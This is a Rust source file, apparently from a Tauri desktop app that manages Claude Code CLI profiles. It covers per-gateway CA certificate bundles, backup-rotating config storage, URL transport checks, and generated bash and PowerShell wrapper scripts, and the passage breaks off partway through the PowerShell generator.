#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use tauri::Manager;

mod claude_cli;
mod credentials;
mod extensions;
mod health;
mod mcp;
mod shared_config;
mod sync;
mod workbuddy;

const MARK: &str = "# cc-manager-integration";
const KEYCHAIN_PREFIX: &str = "cc-manager";

#[derive(Serialize, Deserialize, Clone, Default)]
#[serde(rename_all = "camelCase")]
struct Profile {
    name: String,
    #[serde(rename = "type")]
    type_: String,
    #[serde(default)]
    base_url: String,
    #[serde(default)]
    token_enc: Option<String>,
    #[serde(default)]
    has_token: bool,
    #[serde(default)]
    opus_model: String,
    #[serde(default)]
    sonnet_model: String,
    #[serde(default)]
    haiku_model: String,
}

#[derive(Serialize)]
struct EnvInfo {
    platform: String,
    platform_ui: PlatformUi,
    claude_found: bool,
    claude_detection: claude_cli::ClaudeDetection,
    integrated: bool,
    cert_imported: bool,
    cert_count: usize,
}

#[derive(Serialize)]
struct PlatformUi {
    cert_path_example: String,
    shell_reload_instruction: String,
    gateway_certificate_instruction: String,
    terminal_support_instruction: String,
    credential_storage_instruction: String,
    cleanup_instruction: String,
}

fn platform_ui(platform: &str) -> PlatformUi {
    match platform {
        "windows" => PlatformUi {
            cert_path_example: r"C:\path\to\ca-cert.pem".into(),
            shell_reload_instruction:
                "保存后请重新打开终端窗口；也可在 PowerShell 运行 . $PROFILE 立即生效。".into(),
            gateway_certificate_instruction: "证书只写入所选网关环境的独立信任包，不修改 Windows 系统根证书库，也不需要管理员权限。".into(),
            terminal_support_instruction: "支持 PowerShell 5.1 与 PowerShell 7+；暂不支持 cmd.exe、Git Bash 和 WSL。".into(),
            credential_storage_instruction: "网关 Token 使用 Windows DPAPI 按当前用户加密；同一登录用户下的其他程序仍可能解密，密文会随配置备份导出。WorkBuddy Key 以及 MCP env/header 密钥保存在受权限保护的明文文件中。".into(),
            cleanup_instruction: "终端接入位于 PowerShell 的 $PROFILE；删除带 # cc-manager-integration 标记的区段即可撤销。全部应用配置位于当前用户目录下的 .cc-manager 文件夹。".into(),
        },
        "macos" => PlatformUi {
            cert_path_example: "/Users/you/ca-cert.pem".into(),
            shell_reload_instruction:
                "保存后请重新打开终端窗口；也可运行 source ~/.zshrc 立即生效。".into(),
            gateway_certificate_instruction: "证书只写入所选网关环境的独立信任包，不修改 macOS 钥匙串，也不需要管理员权限。".into(),
            terminal_support_instruction: "支持 zsh 与 bash；暂不支持 fish 和 sh。".into(),
            credential_storage_instruction: "网关 Token 保存在 macOS 钥匙串中。WorkBuddy Key 以及 MCP env/header 密钥保存在仅限当前用户读取的明文文件中。".into(),
            cleanup_instruction: "终端接入通常位于 ~/.zshrc 或 bash 配置文件；删除带 # cc-manager-integration 标记的区段即可撤销。全部应用配置位于 ~/.cc-manager。".into(),
        },
        _ => PlatformUi {
            cert_path_example: "/path/to/ca-cert.pem".into(),
            shell_reload_instruction: "保存后请重新打开终端窗口使配置生效。".into(),
            gateway_certificate_instruction: "证书只写入所选网关环境的独立信任包。".into(),
            terminal_support_instruction: "请在诊断页面确认当前终端是否已接入。".into(),
            credential_storage_instruction: "请妥善保护本机凭证文件与配置备份。".into(),
            cleanup_instruction: "从终端配置中删除带 # cc-manager-integration 标记的区段即可撤销接入。".into(),
        },
    }
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct ProfileRuntimeInfo {
    name: String,
    config_dir: String,
    settings_exists: bool,
    has_project_data: bool,
    last_used: Option<u64>,
    authenticated: bool,
    shared_dirs_ok: bool,
}

fn newest_modified(dir: &std::path::Path) -> Option<std::time::SystemTime> {
    let mut newest: Option<std::time::SystemTime> = None;
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            let modified = if path.is_dir() {
                newest_modified(&path)
            } else {
                fs::metadata(&path).and_then(|m| m.modified()).ok()
            };
            if let Some(value) = modified {
                if newest.map(|current| value > current).unwrap_or(true) {
                    newest = Some(value);
                }
            }
        }
    }
    newest
}

// ---------------- 路径 ----------------
pub(crate) fn home() -> PathBuf {
    // 调试桌面测试使用独立数据根；发行版不接受此覆盖。
    #[cfg(debug_assertions)]
    if let Some(path) = std::env::var_os("CC_MANAGER_TEST_HOME") {
        let path = PathBuf::from(path);
        assert!(path.is_absolute(), "测试数据根必须是绝对路径");
        return path;
    }
    dirs::home_dir().unwrap_or_else(|| PathBuf::from("."))
}
pub(crate) fn cfg_dir() -> PathBuf {
    home().join(".cc-manager")
}
fn cfg_path() -> PathBuf {
    cfg_dir().join("config.json")
}
fn cfg_backup_path() -> PathBuf {
    cfg_dir().join("config.backup.json")
}
/// 存量时代的**单一** CA 文件：所有网关共用一份（这是审查第 3 条的缺陷本体）。
/// 现在只用于**迁移读取**，不再被任何生成脚本注入。
fn legacy_cert_path() -> PathBuf {
    cfg_dir().join("ca-cert.pem")
}

/// 每个**网关环境**各自的 CA 信任库目录 —— 约束 5「网关之间的 CA 彼此隔离」的落点。
///
/// 为什么不搞"共享 bundle ∪ 网关 bundle"：**任何全局共享的 CA 按定义就是所有网关都信任**，
/// 那只是把同一个信任面换个名字留下。便利性由"应用到所有网关环境"的**循环导入**解决。
fn ca_dir() -> PathBuf {
    cfg_dir().join("ca")
}

/// 环境名 → bundle 文件名。`None` 表示这个名字不能安全地当文件名用。
///
/// 刻意**不**回退成哈希名：那样用户在磁盘上找不到自己的证书，排查只会更难。
/// 挡的是会跑出目录/跨盘的字符；中文、点号这些老规则的合法名字继续放行。
/// （实际调用点还有 `can_have_terminal_entry` 兜底，它只放行 `字母数字 - _ .`。）
fn ca_bundle_file(env: &str) -> Option<String> {
    let unsafe_name = env.is_empty()
        || env == "."
        || env == ".."
        || env
            .chars()
            .any(|c| c == '/' || c == '\\' || c == ':' || c.is_control());
    if unsafe_name {
        None
    } else {
        Some(format!("{env}.pem"))
    }
}

/// 某个网关环境的 CA bundle 路径。
fn ca_bundle_path(env: &str) -> Option<PathBuf> {
    ca_bundle_file(env).map(|file| ca_dir().join(file))
}

/// 全部网关环境 CA 的**并集**，物化成一个文件，供 WorkBuddy 这类**外部工具**使用。
///
/// ⚠️ 这是**派生**文件，不是信任源 —— 信任源永远是各网关自己的 `ca/<环境>.pem`。
/// 每次调用都按当前各网关的 bundle 重新生成，避免它与真实来源不一致。
/// （WorkBuddy 不是 Claude 网关环境，它看到并集不违反约束 5；约束 5 管的是网关**之间**。）
fn union_ca_bundle_path() -> PathBuf {
    let path = cfg_dir().join("ca-union.pem");
    let mut text = String::new();
    let mut seen: Vec<String> = vec![];
    for env in router_env_names() {
        for block in bundle_blocks(&env) {
            if !has_block(&seen, &block) {
                seen.push(block.clone());
                text.push_str(&block);
                text.push('\n');
            }
        }
    }
    let _ = fs::create_dir_all(cfg_dir());
    if text.is_empty() {
        // 一个网关都没有证书时把派生文件删掉，免得它继续被当成"还有 CA"
        let _ = fs::remove_file(&path);
    } else {
        // 写不出去只影响 WorkBuddy 那条链路；读它的调用方会拿到空内容并自行提示
        let _ = fs::write(&path, text);
    }
    path
}

/// 迁移标记：把存量的单一 `ca-cert.pem` 分配给各网关只做**一次**。
fn ca_migration_marker() -> PathBuf {
    cfg_dir().join("ca-migrated-to-per-gateway")
}

/// 把老的单一 `ca-cert.pem` 里的证书**增量补齐**到每个网关的 bundle。
///
/// 为什么是"每次都对账"而不是"首次迁移一次就完事"：
/// 用户完全可能在**旧版**里继续导入证书（旧版只会往 `ca-cert.pem` 追加）。
/// 只做一次的迁移会**永远漏掉那之后新增的证书** —— 对应的网关连不上，
/// 而用户完全不知道为什么。所以判据是**证书指纹集合**，每次启动补齐差额。
///
/// 反过来也不会碍事：用户已经按网关删掉的证书不在"新证书"里，不会被塞回去。
///
/// **刻意不删旧文件**：用户可能在别处引用它；删掉之后万一逻辑有问题也无从回溯。
fn reconcile_shared_ca() -> Option<String> {
    let _guard = sync::acquire_config_lock()?;
    let marker = ca_migration_marker();
    let legacy = legacy_cert_path();
    let blocks = fs::read_to_string(&legacy)
        .map(|t| pem_blocks(&t))
        .unwrap_or_default();

    // 标记里存的是**已经搬过去的证书指纹集合**，不是一个布尔值。
    //
    // 这一点很要紧：用户完全可能在**旧版**里又导入一张证书（旧版只会往
    // `ca-cert.pem` 里追加）。如果标记只是个"做过了"的开关，新版就会**永远漏掉
    // 那张证书** —— 对应的网关连不上，而用户完全不知道为什么。
    // 存指纹集合就能每次都做**增量补齐**，同时不会把用户已按网关删掉的证书又塞回去。
    //
    // 兼容旧格式：标记内容是 `1`（旧实现写的布尔值）时，把**当前** ca-cert.pem 里的
    // 证书视为"已迁移"作为基线，之后新增的仍会被识别出来。
    let existing = fs::read_to_string(&marker).unwrap_or_default();
    let mut migrated: Vec<String> = if existing.trim() == "1" {
        blocks.iter().map(|b| cert_fingerprint(b)).collect()
    } else {
        serde_json::from_str::<Vec<String>>(existing.trim()).unwrap_or_default()
    };

    let fresh: Vec<&String> = certs_pending_migration(&blocks, &migrated);

    let mut assigned: Vec<String> = vec![];
    let mut failed: Vec<String> = vec![];
    if !fresh.is_empty() && fs::create_dir_all(ca_dir()).is_ok() {
        for env in router_env_names() {
            let Some(dest) = ca_bundle_path(&env) else {
                continue;
            };
            let have = match fs::read_to_string(&dest) {
                Ok(text) => text,
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
                Err(e) => {
                    failed.push(format!("{env}：{e}"));
                    continue;
                }
            };
            let have_blocks = pem_blocks(&have);
            let mut text = have.clone();
            let mut added = false;
            for block in &fresh {
                if has_block(&have_blocks, block) {
                    continue;
                }
                if !text.is_empty() && !text.ends_with('\n') {
                    text.push('\n');
                }
                text.push_str(block);
                text.push('\n');
                added = true;
            }
            if added {
                match sync::write_bytes_atomic(&dest, text.as_bytes()) {
                    Ok(()) => assigned.push(env),
                    Err(e) => failed.push(format!("{env}：{e}")),
                }
            }
        }
    }
    // 只有真的写成功（或本来就没有新证书）才更新标记 —— 写失败时要能重试
    if failed.is_empty() && (fresh.is_empty() || ca_dir().is_dir() || router_env_names().is_empty())
    {
        for block in &fresh {
            migrated.push(cert_fingerprint(block));
        }
        if let Ok(json) = serde_json::to_string(&migrated) {
            if let Err(e) = sync::write_bytes_atomic(&marker, json.as_bytes()) {
                failed.push(format!("迁移记录写入失败：{e}"));
            }
        }
    }

    if !failed.is_empty() {
        return Some(format!(
            "CA 迁移未全部完成，下次重试：{}",
            failed.join("；")
        ));
    }

    if assigned.is_empty() {
        return None;
    }
    Some(format!(
        "CA 已改为「按网关隔离」：{} 张证书已补发给 {} 个网关环境（{}）。\
         不再需要它们的网关可以逐个移除；旧文件 ca-cert.pem 保持原样、不再被注入。",
        fresh.len(),
        assigned.len(),
        assigned.join("、")
    ))
}

/// 该补发给各网关的证书 = `ca-cert.pem` 里有、但**已迁移集合**里没有的那些。
///
/// 抽成纯函数是因为这条判定最容易做错、也最难被发现：
/// 漏掉一张证书 → 对应网关联不上自签网关，而错误现场（TLS 失败）离原因非常远。
fn certs_pending_migration<'a>(blocks: &'a [String], migrated: &[String]) -> Vec<&'a String> {
    blocks
        .iter()
        .filter(|b| !migrated.contains(&cert_fingerprint(b)))
        .collect()
}

/// 证书指纹（按归一化后的 PEM 算 SHA-256）。用于"这张证书搬过没有"的判等。
fn cert_fingerprint(block: &str) -> String {
    use sha2::{Digest, Sha256};
    hex::encode(Sha256::digest(norm_pem(block).as_bytes()))
}

/// 当前配置里所有**网关环境**的名字（独立登录环境不注入 CA，不参与）。
fn router_env_names() -> Vec<String> {
    load()
        .into_iter()
        .filter(|p| p.type_ == "router" && !p.name.is_empty())
        .map(|p| p.name)
        .collect()
}
fn sh_path() -> PathBuf {
    cfg_dir().join("cc.sh")
}
fn ps_path() -> PathBuf {
    cfg_dir().join("cc.ps1")
}

// ---------------- 配置读写 ----------------
fn normalize_base_url(value: &str) -> String {
    value.trim().trim_end_matches('/').to_string()
}

fn parse_profiles(path: &Path) -> Option<Vec<Profile>> {
    let text = fs::read_to_string(path).ok()?;
    let value = serde_json::from_str::<serde_json::Value>(&text).ok()?;
    let profiles = value.get("profiles")?.clone();
    let mut list = serde_json::from_value::<Vec<Profile>>(profiles).ok()?;
    // 手工编辑的配置也要经过归一化，避免启动同步直接把首尾空格写进终端脚本。
    for profile in &mut list {
        if profile.type_ == "router" {
            profile.base_url = normalize_base_url(&profile.base_url);
        }
    }
    Some(list)
}

fn corrupt_path(primary: &Path) -> PathBuf {
    let first = primary.with_extension("corrupt.json");
    if !first.exists() {
        return first;
    }
    for i in 1..=9999 {
        let candidate = primary.with_extension(format!("corrupt.{i}.json"));
        if !candidate.exists() {
            return candidate;
        }
    }
    primary.with_extension("corrupt.latest.json")
}

fn load_from(primary: &Path, backup: &Path) -> Vec<Profile> {
    if let Some(list) = parse_profiles(primary) {
        return list;
    }
    // 主配置缺失或损坏时回退到最近一次有效备份。恢复写回尽力而为；
    // 即使磁盘暂时只读，本次启动仍能继续使用备份中的配置。
    if let Some(list) = parse_profiles(backup) {
        if primary.exists() {
            // 恢复前保留损坏现场；移动失败时不覆盖原文件，但仍用备份支撑本次运行。
            let _ = fs::rename(primary, corrupt_path(primary));
        }
        if !primary.exists() {
            let _ = fs::copy(backup, primary);
        }
        return list;
    }
    vec![]
}

fn load() -> Vec<Profile> {
    load_from(&cfg_path(), &cfg_backup_path())
}

fn save_to(primary: &Path, backup: &Path, list: &[Profile]) -> std::io::Result<()> {
    if let Some(parent) = primary.parent() {
        fs::create_dir_all(parent)?;
    }
    let obj = serde_json::json!({ "profiles": list });
    let text = serde_json::to_string_pretty(&obj)?;
    let tmp = primary.with_extension("json.tmp");
    fs::write(&tmp, text)?;

    // 备份采用两阶段轮换：先生成 next，再把旧备份挪到 previous，最后提升 next。
    // 全程不会出现“先删掉唯一备份、再尝试 rename”的无保护窗口。
    if primary.exists() {
        if parse_profiles(primary).is_some() {
            let backup_next = backup.with_extension("next.json");
            let backup_previous = backup.with_extension("previous.json");
            if backup_next.exists() {
                fs::remove_file(&backup_next)?;
            }
            fs::copy(primary, &backup_next)?;
            if parse_profiles(&backup_next).is_none() {
                let _ = fs::remove_file(&backup_next);
                let _ = fs::remove_file(&tmp);
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    "新备份校验失败",
                ));
            }
            if backup.exists() {
                if backup_previous.exists() {
                    fs::remove_file(&backup_previous)?;
                }
                fs::rename(backup, &backup_previous)?;
            }
            if let Err(e) = fs::rename(&backup_next, backup) {
                if backup_previous.exists() && !backup.exists() {
                    let _ = fs::rename(&backup_previous, backup);
                }
                let _ = fs::remove_file(&tmp);
                return Err(e);
            }
        } else {
            // 不让损坏主文件挡住新配置落盘，同时保留现场便于诊断。
            fs::rename(primary, corrupt_path(primary))?;
        }
    }

    // Windows 不允许 rename 覆盖已有目标；先把主配置挪到 previous。
    // 此时新的有效 backup 已经就位，提升失败仍可恢复主配置。
    let primary_previous = primary.with_extension("previous.json");
    if primary.exists() {
        if primary_previous.exists() {
            fs::remove_file(&primary_previous)?;
        }
        fs::rename(primary, &primary_previous)?;
    }
    if let Err(e) = fs::rename(&tmp, primary) {
        if primary_previous.exists() {
            let _ = fs::rename(&primary_previous, primary);
        } else if !primary.exists() && backup.exists() {
            let _ = fs::copy(backup, primary);
        }
        let _ = fs::remove_file(&tmp);
        return Err(e);
    }
    let _ = fs::remove_file(&primary_previous);
    let _ = fs::remove_file(backup.with_extension("previous.json"));
    // 首次保存时还没有“上一版”，也留一份当前有效副本作为恢复基线。
    if !backup.exists() {
        fs::copy(primary, backup)?;
    }
    Ok(())
}

fn save(list: &[Profile]) -> std::io::Result<()> {
    save_to(&cfg_path(), &cfg_backup_path(), list)
}

/// 远程 http:// 被拒绝时统一用这句，两条网关路径（Claude / WorkBuddy）共用。
pub(crate) const PLAINTEXT_TRANSPORT_REJECTED: &str =
    "远程 http:// 不被接受：Key 会以明文经过网络。请改用 https://，或使用本机回环地址（localhost / 127.0.0.1 / ::1）。";

/// 传输是否可接受：`https` 一律放行；`http` **只放行 loopback**。
///
/// 理由：Claude 网关的 `Authorization: Bearer <Key>` 与 WorkBuddy 的员工 Key
/// 在 http 下都是明文过网，而界面此前只给一个中性的「无需证书」。远程明文直接拒绝；
/// 本机回环保留 —— 那种流量不出网卡，没有中间人面。
pub(crate) fn transport_is_loopback_or_secure(url: &str) -> bool {
    let Ok(parsed) = url::Url::parse(url.trim()) else {
        return false;
    };
    match parsed.scheme() {
        "https" => true,
        "http" => match parsed.host() {
            Some(url::Host::Domain(domain)) => domain.eq_ignore_ascii_case("localhost"),
            Some(url::Host::Ipv4(ip)) => ip.is_loopback(),
            Some(url::Host::Ipv6(ip)) => ip.is_loopback(),
            None => false,
        },
        _ => false,
    }
}

/// 地址的**书写形态**是否合法（scheme / 长度 / 无空白控制字符）。
///
/// **刻意不含**传输安全策略 —— 两件事的原因和修法完全不同，折叠成一个布尔
/// 会让「远程明文被拒」被报成「地址格式错误」，用户改半天格式也修不好。
/// 需要完整校验用 [`valid_base_url`]；需要分别报错用本函数 + [`transport_is_loopback_or_secure`]。
fn base_url_shape_ok(value: &str) -> bool {
    let value = normalize_base_url(value);
    (value.starts_with("https://") || value.starts_with("http://"))
        && value.len() <= 2048
        && !value.chars().any(|c| c.is_control() || c.is_whitespace())
}

fn valid_base_url(value: &str) -> bool {
    let value = normalize_base_url(value);
    // 远程 http 会明文发送 API Key，见 transport_is_loopback_or_secure
    base_url_shape_ok(&value) && transport_is_loopback_or_secure(&value)
}

/// 网关地址被拒的**原因**。两种原因的修法完全不同，所以是类型而不是布尔。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum BaseUrlRejection {
    /// 书写形态就不对（缺 scheme / 有空格 / 超长）。
    Malformed,
    /// 形态合法，但传输不安全（远程明文 http）—— 改格式没用，得换 https 或回环地址。
    PlaintextTransport,
}

impl BaseUrlRejection {
    /// 用户可见文案。**文案只有这一处**，避免同一策略散出两套说法。
    pub(crate) fn message(self) -> &'static str {
        match self {
            Self::Malformed => "网关地址必须是有效的 http:// 或 https:// 地址，且不能包含空格。",
            Self::PlaintextTransport => PLAINTEXT_TRANSPORT_REJECTED,
        }
    }
}

/// 网关地址不合法时给出**原因准确**的拒绝理由；合法则返回 `None`。
///
/// **保存与探测共用这一处**：同一个策略散出两套说法，就会出现「地址明明写得对，
/// 却被告知格式错误」—— 用户怎么改都修不好，因为真正的原因（远程明文被拒）没说出来。
pub(crate) fn base_url_rejection(value: &str) -> Option<BaseUrlRejection> {
    let value = normalize_base_url(value);
    if !base_url_shape_ok(&value) {
        return Some(BaseUrlRejection::Malformed);
    }
    if !transport_is_loopback_or_secure(&value) {
        return Some(BaseUrlRejection::PlaintextTransport);
    }
    None
}

// ---------------- shell 引用 ----------------
fn sh_q(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}
fn ps_q(s: &str) -> String {
    format!("'{}'", s.replace('\'', "''"))
}

// ---------------- 生成集成脚本 ----------------

/// 受管理的网关环境变量**全集**。两种 Shell 共用这一份定义，避免漂移。
///
/// 每个受管理环境启动前会**先全部清掉**，再只设置该环境配置了的项 ——
/// 这就是"封闭变量集"（审查 2026-09-12 第 2 条）：
/// 不清的话，未配置的模型映射 / Token / CA 会从调用者的 Shell **继承**进来，
/// 于是独立登录环境可能被带去第三方网关、无 Token 的 router 可能把调用者的
/// 凭证发给自己的网关。继承是"静默串环境"，这比报错难查得多。
///
/// `CLAUDE_CONFIG_DIR` 也在集合里：环境分支一定会重新设置它，
/// 列进来是为了让"清空 → 重设"这一步在两种 Shell 里形状完全一致。
const MANAGED_ENV: [&str; 10] = [
    "CLAUDE_CONFIG_DIR",
    "ANTHROPIC_BASE_URL",
    "ANTHROPIC_AUTH_TOKEN",
    "ANTHROPIC_API_KEY",
    "ANTHROPIC_MODEL",
    "ANTHROPIC_DEFAULT_OPUS_MODEL",
    "ANTHROPIC_DEFAULT_SONNET_MODEL",
    "ANTHROPIC_DEFAULT_HAIKU_MODEL",
    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC",
    "NODE_EXTRA_CA_CERTS",
];

fn generate_sh(list: &[Profile]) -> String {
    let exe = std::env::current_exe()
        .map(|p| p.display().to_string())
        .unwrap_or_default();
    generate_sh_for_executable(list, &exe)
}

fn generate_sh_for_executable(list: &[Profile], exe: &str) -> String {
    let mut o = String::from("#!/bin/bash\n# Auto-generated by PathMux. Do not edit.\n");
    // 约束 1：默认 `claude` 必须**零副作用透传**。所以脚本**加载时（source）什么都不做**：
    // 不导出环境变量、不同步配置 —— 默认 `claude` 与同一终端里的其他 Node 程序都不受影响。
    // CA 属于网关环境的信任配置，只在 `claude <网关环境>` 这一次启动时注入（见下方 router 分支）。
    // 每次启动/退出**环境**前后调本程序 --sync：分发 Skills / Agents 与共享 MCP。
    // 插件必须由 Claude Code 官方 plugin 命令处理，不进入这条快捷同步路径。
    o += &format!("_ccm_exe={}\n", sh_q(&exe));
    o += "_ccm_sync() { if [ -x \"$_ccm_exe\" ]; then \"$_ccm_exe\" --sync >/dev/null 2>&1; fi; return 0; }\n";
    o += "claude() {\n  case \"$1\" in\n";
    for p in list {
        let n = &p.name;
        if !can_have_terminal_entry(n) {
            // 不安全名字、或与官方子命令同名的存量名字，绝不写进脚本；
            // install_integration / 健康检查会对此告警（数据本身照常保留、可删）。
            continue;
        }
        o += &format!("    {n})\n");
        if p.type_ == "router" && !valid_base_url(&p.base_url) {
            o += "      echo '网关地址不安全或无效，请在管理中心改用 HTTPS。未启动 Claude。' >&2; return 1 ;;\n";
            continue;
        }
        o += "      local _cch _ccm_tok\n";
        o +=
            &format!("      shift; _cch=\"$HOME/.claude-split/{n}/.claude\"; mkdir -p \"$_cch\"\n");
        if p.type_ == "router" {
            let url = sh_q(&p.base_url);
            let svc = sh_q(&format!("{KEYCHAIN_PREFIX}:{n}"));
            // 凭据读取失败**必须明确报错**，不能拿着空 Key 去连网关
            // （那会把一个配置问题伪装成"鉴权失败"，用户根本查不到原因）。
            o += &format!(
                "      _ccm_tok=\"$(security find-generic-password -s {svc} -w 2>/dev/null)\"\n"
            );
            o += &format!(
                "      if [ -z \"$_ccm_tok\" ]; then echo \"无法从钥匙串读取环境「{n}」的网关 Key（钥匙串项 {svc}）。请在管理中心重新保存该环境。\" >&2; _ccm_sync; return 1; fi\n"
            );
            o += "      _ccm_sync\n";
            // 子 shell 做两件事，缺一不可：
            //  1) **封闭变量集**：先把所有受管网关变量清掉，再只设置本环境配置了的那些。
            //     否则未配置的模型映射、Token、CA 会从调用者的 Shell **继承**进来 ——
            //     独立登录环境可能被带去第三方网关，无 Token 的 router 可能把调用者的
            //     凭证发给自己的网关（审查 2026-09-12 第 2 条）。
            //  2) 隔离作用域：这些变量不会漏进父 shell，默认 `claude` 与同终端其他
            //     Node 程序都不受影响。
            o += "      (\n";
            o += &format!("        unset {}\n", MANAGED_ENV.join(" "));
            // 只注入**这个网关自己的** bundle（约束 5）；文件不存在就不设置。
            // 注意路径里不能出现 `$HOME` 之外的展开 —— 环境名已由 can_have_terminal_entry
            // 限定为 `字母数字 - _ .`，不会破坏脚本语法。
            o += &format!(
                "        [ -f \"$HOME/.cc-manager/ca/{n}.pem\" ] && export NODE_EXTRA_CA_CERTS=\"$HOME/.cc-manager/ca/{n}.pem\"\n"
            );
            o += "        export CLAUDE_CONFIG_DIR=\"$_cch\" ANTHROPIC_AUTH_TOKEN=\"$_ccm_tok\" CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1\n";
            o += &format!("        export ANTHROPIC_BASE_URL={url}\n");
            if !p.opus_model.is_empty() {
                o += &format!(
                    "        export ANTHROPIC_DEFAULT_OPUS_MODEL={}\n",
                    sh_q(&p.opus_model)
                );
            }
            if !p.sonnet_model.is_empty() {
                o += &format!(
                    "        export ANTHROPIC_DEFAULT_SONNET_MODEL={}\n",
                    sh_q(&p.sonnet_model)
                );
            }
            if !p.haiku_model.is_empty() {
                o += &format!(
                    "        export ANTHROPIC_DEFAULT_HAIKU_MODEL={}\n",
                    sh_q(&p.haiku_model)
                );
            }
            o += "        command claude \"$@\"\n";
            o += "      )\n";
            o += "      local _rc=$?; _ccm_sync; return $_rc ;;\n";
        } else {
            o += "      _ccm_sync\n";
            // 独立登录环境只该有 CLAUDE_CONFIG_DIR：其余网关变量一律清掉，
            // 否则调用者 Shell 里的网关地址/Key 会跟着进去，它就连到了别人的网关。
            o += "      (\n";
            o += &format!("        unset {}\n", MANAGED_ENV.join(" "));
            o += "        export CLAUDE_CONFIG_DIR=\"$_cch\"\n";
            o += "        command claude \"$@\"\n";
            o += "      )\n";
            o += "      local _rc=$?; _ccm_sync; return $_rc ;;\n";
        }
    }
    // 默认 `claude`：零写入、零同步、零环境变量污染，原样透传给官方 CLI。
    o += "    *) command claude \"$@\" ;;\n  esac\n}\n";
    o
}

/// PowerShell 侧的受管变量数组字面量（`'A','B',…`），由 `MANAGED_ENV` 派生，
/// 保证两种 Shell 的集合永远一致。
fn ps_managed_list() -> String {
    MANAGED_ENV
        .iter()
        .map(|v| format!("'{v}'"))
        .collect::<Vec<_>>()
        .join(",")
}

fn generate_ps1(list: &[Profile]) -> String {
    // **必须带 UTF-8 BOM。** 生成的脚本里有中文（错误提示），而 Windows PowerShell 5.1
    // 在没有 BOM 时按 **ANSI(GBK)** 读取 .ps1 —— 某些中文字节序列会让**整个脚本解析失败**，
    // 于是 `function claude` 根本没被定义，`claude` 直接落到 PATH 上的官方程序。
    // 症状是"包装器静默失效"，而且看起来一切正常（命令还是跑起来了）。
    // 本机实测：`generated_ps1_propagates_exit_code_and_restores_environment` 就是因为
    // 加入一句中文提示才暴露出来的。
    let mut o = String::from("\u{FEFF}");
    o += "# Auto-generated by PathMux. Do not edit.\n";
    // 约束 1：默认 `claude` 必须**零副作用透传**。脚本**加载时（dot-source）什么都不做**：
    // 不设置环境变量、不同步配置。CA 只属于网关环境，见下方 router 分支。
    // 不能用 param([ValueFromRemainingArguments])：参数绑定器会把 -p、-c 这类
    // 单横线短参数当成“参数名”截走并静默丢弃（--xxx 不像合法参数名才漏得进来）。
    // 普通函数的 $args 原样收下全部参数，短参数才透传得过去。
    o += "function claude {\n";
    o += "  $exe = $null\n";
    o += "  foreach ($cand in @('claude.cmd','claude.exe','claude.bat')) {\n";
    o += "    $c = Get-Command $cand -CommandType Application -ErrorAction SilentlyContinue | Select-Object -First 1\n";
    o += "    if ($c) { $exe = $c.Source; break }\n";
    o += "  }\n";
    // 尚未启动 Claude 的错误也必须**明确报错并给出非零退出码**：
    // 只 Write-Host 后 return 会把上一次的 $LASTEXITCODE 留在调用方那里。
    o += "  if (-not $exe) { Write-Host 'claude not found in PATH'; $global:LASTEXITCODE = 127; return }\n";
    // GUI 子系统 exe 用 & 调用不会等待,pre-sync 必须 Start-Process -Wait;post-sync 可不等
    let ccm_exe = std::env::current_exe()
        .map(|p| p.display().to_string())
        .unwrap_or_default();
    o += &format!("  $ccm = {}\n", ps_q(&ccm_exe));
    o += "  function _ccmSync([switch]$NoWait) { if ($ccm -and (Test-Path $ccm)) { try { if ($NoWait) { Start-Process -FilePath $ccm -ArgumentList '--sync' -WindowStyle Hidden } else { Start-Process -FilePath $ccm -ArgumentList '--sync' -Wait -WindowStyle Hidden } } catch {} } }\n";
    o += "  $sub = if ($args.Count -ge 1) { $args[0] } else { '' }\n";
    // @() 必须包住整个 if 语句:把语句的值赋给变量时,PowerShell 会把单元素数组
    // 拆包成标量字符串,而 splat 一个字符串是按字符展开的(--foo 变成 - - f o o)。
    // 写成 if (...) { @(...) } 无效——拆包发生在赋值这一步,不在分支内部。
    o += "  $rest = @(if ($args.Count -gt 1) { $args[1..($args.Count-1)] } else { @() })\n";
    o += "  switch ($sub) {\n";
    for p in list {
        let n = &p.name;
        if !can_have_terminal_entry(n) {
            // 同 sh 侧：不安全名字、或与官方子命令同名的存量名字都不写进脚本。
            // PowerShell 的 `switch` 大小写不敏感，所以 `MCP` 也必须排除。
            continue;
        }
        o += &format!("    {} {{\n", ps_q(n));
        if p.type_ == "router" && !valid_base_url(&p.base_url) {
            o += "      Write-Host '网关地址不安全或无效，请在管理中心改用 HTTPS。未启动 Claude。'; $global:LASTEXITCODE = 1; return\n    }\n";
            continue;
        }
        o += &format!("      $h = Join-Path $env:USERPROFILE '.claude-split\\{n}\\.claude'\n");
        o += "      New-Item -ItemType Directory -Force -Path $h | Out-Null\n";
        if p.type_ == "router" && p.has_token && p.token_enc.as_deref().unwrap_or("").is_empty() {
            // 配置自相矛盾（标记有 Key 却没有可用密文）：**明确报错**，不要拿空 Key
            // 去连网关 —— 那会把配置问题伪装成"鉴权失败"，用户查不到原因。
            o += &format!(
                "      Write-Host '环境 {n} 没有可用的网关 Key（密文缺失）。请在管理中心重新保存该环境。'; $global:LASTEXITCODE = 1; return\n"
            );
        }
        // $bk 记录**受管变量在启动前是否存在及其值**，finally 里按存在性还原。
        //
        // 用 [Environment]::GetEnvironmentVariables 而不是 `Test-Path Env:\X`：
        // 后者在"不存在"和"存在但为空"上表现相同，而 .NET 的进程环境字典能真正区分。
        // ⚠️ Windows 上二者本来就是同一件事（`$env:X = ''` 就是删除，本机子进程实测
        // 确认），所以 Windows 侧行为不变；真正受益的是 macOS/Linux 的 PowerShell 7，
        // 那里空值环境变量是可表示的。**该平台分支本机无法验证。**
        o += &format!("      $managed = @({})\n", ps_managed_list());
        o += "      $bk = @{}\n";
        o += "      $snapshot = [Environment]::GetEnvironmentVariables('Process')\n";
        o += "      foreach ($k in $managed) { if ($snapshot.ContainsKey($k)) { $bk[$k] = $snapshot[$k] } }\n";
